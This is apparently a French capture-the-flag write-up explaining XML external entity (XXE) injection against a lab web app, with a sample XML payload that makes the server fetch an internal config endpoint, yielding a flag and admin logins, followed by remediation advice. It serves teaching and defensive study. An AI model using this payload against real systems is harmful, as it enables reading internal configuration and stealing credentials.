# 6 - INJECTION XML

## qu'est ce que c'est

Le format XML permet de définir des entités : des raccourcis réutilisables dans un document, un peu comme des variables. La norme XML permet aussi de déclarer des entités externes, qui vont chercher leur contenu ailleurs — sur le disque local, ou même sur le réseau.

Si une application analyse un fichier XML fourni par l’utilisateur (upload, appel API, flux SOAP...) avec un parseur dont cette fonctionnalité n’a pas été désactivée, l’utilisateur peut définir ses propres entités externes, et le parseur va aller chercher ce qu’elles pointent — ce n’est plus juste de la donnée, c’est une instruction.
## comment acceder au flag

apres avoir trouver la faille avec la methode PATCH, un indice nous est laisse par "emilie" disant que l'agenda XML n'est pas valide cote server-side

![XML](Resources/XML.png)

cet indice nous fait comprendre qu'il faut faire une injection XML dans l'agenda, on utilise donc un autre fichier .xml qui extrait des informations contenues dans /internal/config (indice laisse par robots.txt et par le dashboard)

![XML](Resources/XML2.png)

EXEMPLE DE SCRIPT :
```xml
    <?xml version="1.0"?>
    <!DOCTYPE agenda [
    <!ENTITY xxe SYSTEM "http://localhost:4942/internal/config">
    ]>
    <agenda>
    <event>
        <title>&xxe;</title>
        <date>2042-01-15</date>
    </event>
    </agenda>
```

apres avoir importe le fichier, on obtient le nouveau flag ainsi que des login admin qui va nous servir juste apres


![XML](Resources/XML3.png)

## comment solutionner le probleme

Valider les inputs de l’utilisateur, désactiver l’usage de fichiers xml externes si pas nécessaire, utiliser des parsers pour éviter les dérives malicieuses et ne pas donner trop d’informations en cas d’erreur.